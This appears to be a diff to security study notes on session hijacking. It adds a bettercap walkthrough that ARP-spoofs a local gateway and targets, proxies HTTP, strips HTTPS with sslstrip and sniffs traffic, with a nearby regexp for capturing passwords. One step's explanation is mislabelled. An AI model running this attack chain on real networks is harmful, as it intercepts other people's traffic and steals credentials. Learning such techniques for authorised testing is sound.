@@ -42,6 +42,22 @@ Session hijacking allows an attacker to take over an active session by bypassing
 - To set the sniffer to capture only passwords, we can use the following
   - `set net.sniff.regexp '.*password=.+'`
 
+**Performing session hijacking with bettercap**
+- `sudo bettercap -iface eth0`
+- `set arp.spoof.internal true` Enables ARP spoofing inside the local network.
+- `set arp.spoof.gateway 172.16.111.1` Tells Bettercap that the gateway IP is. (172.16.111.1).
+- `set arp.spoof.targets` Normally you’d put one or more IP addresses here (e.g., set arp.spoof.targets 172.16.111.13). This is what makes a Man-in-the-Middle (MITM) possible.
+- `arp.spoof on` Starts a proxy server on your machine that intercepted HTTP requests will flow through. Allows you to see, log, or modify web traffic.
+- `http.proxy on` Starts a proxy server on your machine that intercepted HTTP requests will flow through.
+- `set http.proxy.sslstrip true` This downgrades HTTPS (encrypted) connections to HTTP (unencrypted), so you can read credentials or data in plain text.
+- `net.sniff on` Starts a packet sniffer on the network.
+
+This is all part of a MITM attack chain:
+1. Redirect traffic (ARP spoofing).
+2. Intercept it (HTTP proxy).
+3. Downgrade HTTPS (SSL strip).
+4. Sniff/capture data.
+
 #### 1.3 Hijack a Session using Caido
 Caido assists security professionals and enthusiasts in efficiently auditing web applications. It offers exploration tools, including sitemap, history, and intercept features, which aid in identifying vulnerabilities and analyzing requests in real-time.
 
